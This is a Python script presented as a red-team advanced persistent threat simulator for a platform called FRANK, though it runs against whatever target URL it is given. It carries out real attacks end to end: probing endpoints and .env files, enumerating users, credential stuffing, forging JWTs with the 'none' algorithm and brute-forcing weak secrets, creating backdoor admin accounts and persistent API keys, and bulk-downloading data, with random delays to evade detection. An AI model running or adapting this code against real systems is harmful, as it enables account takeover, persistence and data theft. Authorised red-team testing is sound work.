#!/usr/bin/env python3
"""
Red Team Attack Simulation for FRANK Platform

This module simulates advanced persistent threat (APT) attacks and red team exercises
against the FRANK cybersecurity platform to test detection, response, and resilience.
"""

import requests
import json
import time
import random
import threading
import base64
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
import subprocess
import socket
import uuid

class APTSimulator:
    """Advanced Persistent Threat attack simulation"""
    
    def __init__(self, target_url: str, attack_profile: str = "generic"):
        self.target_url = target_url.rstrip('/')
        self.attack_profile = attack_profile
        self.attack_logs = []
        self.active_sessions = []
        self.compromised_accounts = []
        self.persistence_mechanisms = []
        
        # Attack profiles
        self.profiles = {
            "generic": {
                "name": "Generic APT",
                "duration": 3600,  # 1 hour
                "stealth_level": "medium",
                "techniques": ["reconnaissance", "initial_access", "persistence", "lateral_movement"]
            },
            "nation_state": {
                "name": "Nation State Actor",
                "duration": 7200,  # 2 hours
                "stealth_level": "high",
                "techniques": ["advanced_reconnaissance", "supply_chain", "zero_day", "data_exfiltration"]
            },
            "cybercriminal": {
                "name": "Cybercriminal Group",
                "duration": 1800,  # 30 minutes
                "stealth_level": "low",
                "techniques": ["credential_stuffing", "ransomware", "crypto_mining", "data_theft"]
            },
            "insider_threat": {
                "name": "Malicious Insider",
                "duration": 14400,  # 4 hours
                "stealth_level": "very_high",
                "techniques": ["privilege_abuse", "data_hoarding", "sabotage", "information_leakage"]
            }
        }
        
        self.current_profile = self.profiles.get(attack_profile, self.profiles["generic"])
    
    def log_attack_action(self, phase: str, technique: str, action: str, result: Dict[str, Any]):
        """Log attack actions for analysis"""
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'phase': phase,
            'technique': technique,
            'action': action,
            'result': result,
            'profile': self.attack_profile
        }
        self.attack_logs.append(log_entry)
        print(f"[{phase}] {technique}: {action} - {result.get('status', 'unknown')}")
    
    # Phase 1: Reconnaissance
    def phase_reconnaissance(self) -> Dict[str, Any]:
        """Reconnaissance phase - gather information about the target"""
        print("\n=== PHASE 1: RECONNAISSANCE ===")
        
        reconnaissance_results = {
            'phase': 'reconnaissance',
            'techniques': [],
            'intelligence_gathered': {}
        }
        
        # Technique 1: Service enumeration
        service_enum = self._enumerate_services()
        reconnaissance_results['techniques'].append(service_enum)
        self.log_attack_action("reconnaissance", "service_enumeration", "scan_endpoints", service_enum)
        
        # Technique 2: Technology stack identification
        tech_stack = self._identify_technology_stack()
        reconnaissance_results['techniques'].append(tech_stack)
        self.log_attack_action("reconnaissance", "technology_identification", "fingerprint_services", tech_stack)
        
        # Technique 3: User enumeration
        user_enum = self._enumerate_users()
        reconnaissance_results['techniques'].append(user_enum)
        self.log_attack_action("reconnaissance", "user_enumeration", "discover_accounts", user_enum)
        
        # Technique 4: Configuration analysis
        config_analysis = self._analyze_configurations()
        reconnaissance_results['techniques'].append(config_analysis)
        self.log_attack_action("reconnaissance", "configuration_analysis", "identify_misconfigurations", config_analysis)
        
        return reconnaissance_results
    
    def _enumerate_services(self) -> Dict[str, Any]:
        """Enumerate available services and endpoints"""
        discovered_endpoints = []
        common_endpoints = [
            '/health', '/v1/sightings', '/v1/indicators', '/v1/users',
            '/admin', '/api/v1', '/docs', '/swagger', '/api-docs',
            '/metrics', '/status', '/debug', '/config', '/version'
        ]
        
        for endpoint in common_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = requests.get(url, timeout=5)
                
                discovered_endpoints.append({
                    'endpoint': endpoint,
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'headers': dict(response.headers)
                })
                
                # Small delay to avoid detection
                time.sleep(random.uniform(0.5, 2.0))
                
            except Exception as e:
                continue
        
        return {
            'technique': 'service_enumeration',
            'status': 'completed',
            'discovered_endpoints': discovered_endpoints,
            'endpoint_count': len(discovered_endpoints)
        }
    
    def _identify_technology_stack(self) -> Dict[str, Any]:
        """Identify technology stack and versions"""
        technologies = {}
        
        try:
            # Analyze main page
            response = requests.get(self.target_url, timeout=10)
            headers = response.headers
            
            # Check server header
            if 'server' in headers:
                technologies['server'] = headers['server']
            
            # Check for AWS services
            if 'x-amzn-requestid' in headers:
                technologies['cloud_provider'] = 'AWS'
            
            # Check for API Gateway
            if 'x-amzn-remapped-content-length' in headers:
                technologies['api_gateway'] = 'AWS API Gateway'
            
            # Check for CloudFront
            if 'x-amz-cf-id' in headers:
                technologies['cdn'] = 'AWS CloudFront'
            
            # Analyze content for frameworks
            content = response.text.lower()
            
            if 'lambda' in content:
                technologies['compute'] = 'AWS Lambda'
            
            if 'dynamodb' in content or 'dynamo' in content:
                technologies['database'] = 'DynamoDB'
            
        except Exception as e:
            technologies['error'] = str(e)
        
        return {
            'technique': 'technology_identification',
            'status': 'completed',
            'technologies': technologies
        }
    
    def _enumerate_users(self) -> Dict[str, Any]:
        """Attempt to enumerate user accounts"""
        discovered_users = []
        common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'demo', 'guest', 'api', 'service', 'system'
        ]
        
        for username in common_usernames:
            try:
                # Try password reset endpoint
                url = f"{self.target_url}/auth/forgot-password"
                data = {'username': username}
                response = requests.post(url, json=data, timeout=5)
                
                # Different responses might indicate user existence
                if response.status_code in [200, 400]:
                    discovered_users.append({
                        'username': username,
                        'status_code': response.status_code,
                        'likely_exists': response.status_code == 200
                    })
                
                time.sleep(random.uniform(1.0, 3.0))
                
            except Exception:
                continue
        
        return {
            'technique': 'user_enumeration',
            'status': 'completed',
            'discovered_users': discovered_users,
            'potential_users': [u['username'] for u in discovered_users if u['likely_exists']]
        }
    
    def _analyze_configurations(self) -> Dict[str, Any]:
        """Analyze configurations for potential weaknesses"""
        misconfigurations = []
        
        # Check for debug endpoints
        debug_endpoints = ['/debug', '/.env', '/config', '/settings']
        
        for endpoint in debug_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    misconfigurations.append({
                        'type': 'exposed_debug_endpoint',
                        'endpoint': endpoint,
                        'severity': 'high'
                    })
                    
            except Exception:
                continue
        
        # Check security headers
        try:
            response = requests.get(self.target_url, timeout=10)
            headers = response.headers
            
            security_headers = [
                'strict-transport-security',
                'x-frame-options',
                'x-content-type-options',
                'content-security-policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    misconfigurations.append({
                        'type': 'missing_security_header',
                        'header': header,
                        'severity': 'medium'
                    })
                    
        except Exception:
            pass
        
        return {
            'technique': 'configuration_analysis',
            'status': 'completed',
            'misconfigurations': misconfigurations
        }
    
    # Phase 2: Initial Access
    def phase_initial_access(self) -> Dict[str, Any]:
        """Initial access phase - gain foothold in the system"""
        print("\n=== PHASE 2: INITIAL ACCESS ===")
        
        initial_access_results = {
            'phase': 'initial_access',
            'techniques': [],
            'successful_access': False
        }
        
        # Technique 1: Credential stuffing
        cred_stuffing = self._credential_stuffing_attack()
        initial_access_results['techniques'].append(cred_stuffing)
        self.log_attack_action("initial_access", "credential_stuffing", "test_common_passwords", cred_stuffing)
        
        # Technique 2: API key exploitation
        api_exploit = self._exploit_api_keys()
        initial_access_results['techniques'].append(api_exploit)
        self.log_attack_action("initial_access", "api_exploitation", "test_weak_api_keys", api_exploit)
        
        # Technique 3: Token manipulation
        token_exploit = self._exploit_tokens()
        initial_access_results['techniques'].append(token_exploit)
        self.log_attack_action("initial_access", "token_manipulation", "manipulate_jwt_tokens", token_exploit)
        
        # Check if any technique succeeded
        for technique in initial_access_results['techniques']:
            if technique.get('successful_access', False):
                initial_access_results['successful_access'] = True
                break
        
        return initial_access_results
    
    def _credential_stuffing_attack(self) -> Dict[str, Any]:
        """Simulate credential stuffing attack"""
        common_passwords = [
            'password', '123456', 'password123', 'admin',
            'qwerty', '12345678', 'abc123', 'Password1',
            'welcome', 'monkey', '1234567890', 'iloveyou'
        ]
        
        common_usernames = ['admin', 'administrator', 'user', 'test', 'demo']
        
        successful_logins = []
        failed_attempts = 0
        
        for username in common_usernames:
            for password in common_passwords:
                try:
                    url = f"{self.target_url}/auth/login"
                    data = {
                        'username': username,
                        'password': password
                    }
                    
                    response = requests.post(url, json=data, timeout=10)
                    
                    if response.status_code == 200:
                        # Successful login
                        successful_logins.append({
                            'username': username,
                            'password': password,
                            'token': response.json().get('access_token')
                        })
                        self.compromised_accounts.append({'username': username, 'password': password})
                    else:
                        failed_attempts += 1
                    
                    # Delay to avoid rate limiting
                    time.sleep(random.uniform(2.0, 5.0))
                    
                    # Stop if rate limited
                    if response.status_code == 429:
                        break
                        
                except Exception:
                    failed_attempts += 1
                    continue
        
        return {
            'technique': 'credential_stuffing',
            'status': 'completed',
            'successful_logins': len(successful_logins),
            'failed_attempts': failed_attempts,
            'compromised_accounts': successful_logins,
            'successful_access': len(successful_logins) > 0
        }
    
    def _exploit_api_keys(self) -> Dict[str, Any]:
        """Test for weak or exposed API keys"""
        weak_api_keys = [
            'test_key', 'api_key_123', 'development_key',
            'demo_key', '12345', 'password', 'secret',
            'key123', 'testkey', 'devkey'
        ]
        
        valid_keys = []
        
        for api_key in weak_api_keys:
            try:
                url = f"{self.target_url}/v1/sightings"
                headers = {
                    'Authorization': f'Bearer {api_key}',
                    'X-API-Key': api_key
                }
                
                response = requests.get(url, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    valid_keys.append({
                        'api_key': api_key,
                        'access_level': 'unknown'
                    })
                
                time.sleep(random.uniform(1.0, 3.0))
                
            except Exception:
                continue
        
        return {
            'technique': 'api_key_exploitation',
            'status': 'completed',
            'valid_keys': valid_keys,
            'successful_access': len(valid_keys) > 0
        }
    
    def _exploit_tokens(self) -> Dict[str, Any]:
        """Test JWT token manipulation"""
        token_exploits = []
        
        # Try to get a token first
        try:
            url = f"{self.target_url}/auth/login"
            data = {'username': 'test', 'password': 'test'}
            response = requests.post(url, json=data, timeout=10)
            
            if response.status_code == 200:
                token = response.json().get('access_token')
                
                if token:
                    # Test 1: None algorithm attack
                    none_token = self._create_none_algorithm_token(token)
                    if self._test_token(none_token):
                        token_exploits.append({
                            'exploit': 'none_algorithm',
                            'successful': True
                        })
                    
                    # Test 2: Weak secret brute force
                    weak_secret = self._test_weak_jwt_secret(token)
                    if weak_secret:
                        token_exploits.append({
                            'exploit': 'weak_secret',
                            'secret': weak_secret,
                            'successful': True
                        })
                        
        except Exception:
            pass
        
        return {
            'technique': 'token_manipulation',
            'status': 'completed',
            'exploits': token_exploits,
            'successful_access': len(token_exploits) > 0
        }
    
    def _create_none_algorithm_token(self, original_token: str) -> str:
        """Create a token with 'none' algorithm"""
        try:
            import jwt
            
            # Decode without verification
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Create new token with 'none' algorithm
            none_token = jwt.encode(payload, key="", algorithm="none")
            return none_token
            
        except Exception:
            return None
    
    def _test_weak_jwt_secret(self, token: str) -> Optional[str]:
        """Test for weak JWT secrets"""
        weak_secrets = [
            'secret', 'password', '123456', 'key',
            'jwt_secret', 'your_secret', 'secret_key'
        ]
        
        try:
            import jwt
            
            for secret in weak_secrets:
                try:
                    decoded = jwt.decode(token, key=secret, algorithms=["HS256"])
                    return secret
                except jwt.InvalidSignatureError:
                    continue
                    
        except Exception:
            pass
        
        return None
    
    def _test_token(self, token: str) -> bool:
        """Test if a token provides access"""
        try:
            url = f"{self.target_url}/v1/profile"
            headers = {'Authorization': f'Bearer {token}'}
            response = requests.get(url, headers=headers, timeout=10)
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    # Phase 3: Persistence
    def phase_persistence(self) -> Dict[str, Any]:
        """Establish persistence mechanisms"""
        print("\n=== PHASE 3: PERSISTENCE ===")
        
        persistence_results = {
            'phase': 'persistence',
            'techniques': [],
            'persistence_established': False
        }
        
        # Only proceed if we have access
        if not self.compromised_accounts:
            return persistence_results
        
        # Technique 1: Create backdoor accounts
        backdoor_accounts = self._create_backdoor_accounts()
        persistence_results['techniques'].append(backdoor_accounts)
        self.log_attack_action("persistence", "backdoor_accounts", "create_hidden_users", backdoor_accounts)
        
        # Technique 2: API key persistence
        api_persistence = self._establish_api_persistence()
        persistence_results['techniques'].append(api_persistence)
        self.log_attack_action("persistence", "api_persistence", "generate_persistent_keys", api_persistence)
        
        return persistence_results
    
    def _create_backdoor_accounts(self) -> Dict[str, Any]:
        """Attempt to create backdoor user accounts"""
        backdoor_accounts = []
        
        if self.compromised_accounts:
            # Use compromised account to create new accounts
            compromised = self.compromised_accounts[0]
            
            # Login with compromised account
            try:
                url = f"{self.target_url}/auth/login"
                response = requests.post(url, json=compromised)
                
                if response.status_code == 200:
                    token = response.json().get('access_token')
                    
                    # Try to create new user
                    create_url = f"{self.target_url}/v1/users"
                    headers = {'Authorization': f'Bearer {token}'}
                    
                    backdoor_user = {
                        'username': f'svc_backup_{random.randint(1000, 9999)}',
                        'password': 'BackdoorPass123!',
                        'role': 'admin',
                        'email': 'backup@company.internal'
                    }
                    
                    response = requests.post(create_url, json=backdoor_user, headers=headers)
                    
                    if response.status_code in [200, 201]:
                        backdoor_accounts.append(backdoor_user)
                        self.persistence_mechanisms.append({
                            'type': 'backdoor_account',
                            'username': backdoor_user['username']
                        })
                        
            except Exception:
                pass
        
        return {
            'technique': 'backdoor_accounts',
            'status': 'completed',
            'accounts_created': len(backdoor_accounts),
            'backdoor_accounts': backdoor_accounts
        }
    
    def _establish_api_persistence(self) -> Dict[str, Any]:
        """Establish persistent API access"""
        persistent_keys = []
        
        if self.compromised_accounts:
            # Use compromised account to generate API keys
            compromised = self.compromised_accounts[0]
            
            try:
                # Login
                url = f"{self.target_url}/auth/login"
                response = requests.post(url, json=compromised)
                
                if response.status_code == 200:
                    token = response.json().get('access_token')
                    
                    # Generate API key
                    api_url = f"{self.target_url}/v1/api-keys"
                    headers = {'Authorization': f'Bearer {token}'}
                    
                    key_data = {
                        'name': f'backup_integration_{random.randint(1000, 9999)}',
                        'permissions': ['read', 'write'],
                        'expires': (datetime.utcnow() + timedelta(days=365)).isoformat()
                    }
                    
                    response = requests.post(api_url, json=key_data, headers=headers)
                    
                    if response.status_code in [200, 201]:
                        api_key = response.json().get('api_key')
                        persistent_keys.append({
                            'name': key_data['name'],
                            'api_key': api_key
                        })
                        
                        self.persistence_mechanisms.append({
                            'type': 'api_key',
                            'key_name': key_data['name']
                        })
                        
            except Exception:
                pass
        
        return {
            'technique': 'api_persistence',
            'status': 'completed',
            'keys_generated': len(persistent_keys),
            'persistent_keys': persistent_keys
        }
    
    # Phase 4: Data Exfiltration
    def phase_data_exfiltration(self) -> Dict[str, Any]:
        """Simulate data exfiltration"""
        print("\n=== PHASE 4: DATA EXFILTRATION ===")
        
        exfiltration_results = {
            'phase': 'data_exfiltration',
            'techniques': [],
            'data_exfiltrated': 0
        }
        
        # Technique 1: Bulk data download
        bulk_download = self._bulk_data_exfiltration()
        exfiltration_results['techniques'].append(bulk_download)
        self.log_attack_action("data_exfiltration", "bulk_download", "download_threat_data", bulk_download)
        
        # Technique 2: Sensitive data search
        sensitive_search = self._search_sensitive_data()
        exfiltration_results['techniques'].append(sensitive_search)
        self.log_attack_action("data_exfiltration", "sensitive_search", "search_classified_data", sensitive_search)
        
        return exfiltration_results
    
    def _bulk_data_exfiltration(self) -> Dict[str, Any]:
        """Attempt bulk data download"""
        exfiltrated_data = []
        
        if self.compromised_accounts:
            # Use compromised credentials
            compromised = self.compromised_accounts[0]
            
            try:
                # Login
                url = f"{self.target_url}/auth/login"
                response = requests.post(url, json=compromised)
                
                if response.status_code == 200:
                    token = response.json().get('access_token')
                    headers = {'Authorization': f'Bearer {token}'}
                    
                    # Download sightings
                    sightings_url = f"{self.target_url}/v1/sightings"
                    params = {'limit': 1000}  # Large limit
                    response = requests.get(sightings_url, headers=headers, params=params)
                    
                    if response.status_code == 200:
                        sightings = response.json().get('sightings', [])
                        exfiltrated_data.extend(sightings)
                    
                    # Download indicators
                    indicators_url = f"{self.target_url}/v1/indicators"
                    response = requests.get(indicators_url, headers=headers, params=params)
                    
                    if response.status_code == 200:
                        indicators = response.json().get('indicators', [])
                        exfiltrated_data.extend(indicators)
                        
            except Exception:
                pass
        
        return {
            'technique': 'bulk_download',
            'status': 'completed',
            'records_exfiltrated': len(exfiltrated_data),
            'data_types': ['sightings', 'indicators']
        }
    
    def _search_sensitive_data(self) -> Dict[str, Any]:
        """Search for sensitive information"""
        sensitive_keywords = [
            'password', 'secret', 'key', 'token', 'classified',
            'confidential', 'private', 'internal', 'admin'
        ]
        
        sensitive_findings = []
        
        if self.compromised_accounts:
            # Use compromised credentials to search
            compromised = self.compromised_accounts[0]
            
            try:
                # Login
                url = f"{self.target_url}/auth/login"
                response = requests.post(url, json=compromised)
                
                if response.status_code == 200:
                    token = response.json().get('access_token')
                    headers = {'Authorization': f'Bearer {token}'}
                    
                    # Search for sensitive data
                    for keyword in sensitive_keywords:
                        search_url = f"{self.target_url}/v1/search"
                        params = {'query': keyword, 'limit': 100}
                        response = requests.get(search_url, headers=headers, params=params)
                        
                        if response.status_code == 200:
                            results = response.json().get('results', [])
                            if results:
                                sensitive_findings.append({
                                    'keyword': keyword,
                                    'results_count': len(results),
                                    'sample_results': results[:5]  # Sample
                                })
                                
                        time.sleep(random.uniform(1.0, 2.0))
                        
            except Exception:
                pass
        
        return {
            'technique': 'sensitive_search',
            'status': 'completed',
            'keywords_searched': len(sensitive_keywords),
            'sensitive_findings': len(sensitive_findings),
            'findings_detail': sensitive_findings
        }
    
    def run_full_apt_simulation(self) -> Dict[str, Any]:
        """Run complete APT attack simulation"""
        print(f"\n{'='*60}")
        print(f"STARTING APT SIMULATION: {self.current_profile['name']}")
        print(f"Target: {self.target_url}")
        print(f"Duration: {self.current_profile['duration']} seconds")
        print(f"Stealth Level: {self.current_profile['stealth_level']}")
        print(f"{'='*60}")
        
        start_time = datetime.utcnow()
        
        # Execute attack phases
        simulation_results = {
            'attack_profile': self.current_profile,
            'start_time': start_time.isoformat(),
            'phases': {},
            'summary': {}
        }
        
        # Phase 1: Reconnaissance
        simulation_results['phases']['reconnaissance'] = self.phase_reconnaissance()
        
        # Phase 2: Initial Access
        simulation_results['phases']['initial_access'] = self.phase_initial_access()
        
        # Phase 3: Persistence (only if access gained)
        if simulation_results['phases']['initial_access']['successful_access']:
            simulation_results['phases']['persistence'] = self.phase_persistence()
        
        # Phase 4: Data Exfiltration (only if access gained)
        if self.compromised_accounts:
            simulation_results['phases']['data_exfiltration'] = self.phase_data_exfiltration()
        
        # Calculate summary
        end_time = datetime.utcnow()
        duration = (end_time - start_time).total_seconds()
        
        simulation_results['end_time'] = end_time.isoformat()
        simulation_results['duration_seconds'] = duration
        simulation_results['attack_logs'] = self.attack_logs
        simulation_results['compromised_accounts'] = len(self.compromised_accounts)
        simulation_results['persistence_mechanisms'] = len(self.persistence_mechanisms)
        
        # Generate summary
        simulation_results['summary'] = {
            'attack_successful': len(self.compromised_accounts) > 0,
            'phases_completed': len(simulation_results['phases']),
            'reconnaissance_endpoints': len(simulation_results['phases']['reconnaissance']['techniques'][0].get('discovered_endpoints', [])),
            'initial_access_success': simulation_results['phases']['initial_access']['successful_access'],
            'persistence_established': len(self.persistence_mechanisms) > 0,
            'detection_evasion': self._calculate_detection_evasion(),
            'overall_impact': self._calculate_impact_score()
        }
        
        print(f"\n{'='*60}")
        print("APT SIMULATION COMPLETE")
        print(f"Duration: {duration:.1f} seconds")
        print(f"Attack Successful: {simulation_results['summary']['attack_successful']}")
        print(f"Compromised Accounts: {len(self.compromised_accounts)}")
        print(f"Persistence Mechanisms: {len(self.persistence_mechanisms)}")
        print(f"{'='*60}")
        
        return simulation_results
    
    def _calculate_detection_evasion(self) -> float:
        """Calculate detection evasion score"""
        # Simple heuristic based on stealth level and success rate
        stealth_scores = {
            'very_high': 0.9,
            'high': 0.7,
            'medium': 0.5,
            'low': 0.2
        }
        
        base_score = stealth_scores.get(self.current_profile['stealth_level'], 0.5)
        
        # Adjust based on success
        if self.compromised_accounts:
            base_score += 0.1
        
        return min(base_score, 1.0)
    
    def _calculate_impact_score(self) -> float:
        """Calculate overall attack impact score"""
        impact = 0.0
        
        # Initial access
        if self.compromised_accounts:
            impact += 0.3
        
        # Persistence
        if self.persistence_mechanisms:
            impact += 0.3
        
        # Data access
        for log in self.attack_logs:
            if 'exfiltration' in log.get('phase', ''):
                impact += 0.4
                break
        
        return min(impact, 1.0)

def main():
    """Main function to run APT simulation"""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python apt_simulation.py <target_url> [attack_profile]")
        print("Attack profiles: generic, nation_state, cybercriminal, insider_threat")
        sys.exit(1)
    
    target_url = sys.argv[1]
    attack_profile = sys.argv[2] if len(sys.argv) > 2 else "generic"
    
    # Initialize APT simulator
    simulator = APTSimulator(target_url, attack_profile)
    
    # Run simulation
    results = simulator.run_full_apt_simulation()
    
    # Save results
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"apt_simulation_{attack_profile}_{timestamp}.json"
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nResults saved to {filename}")

if __name__ == "__main__":
    main()
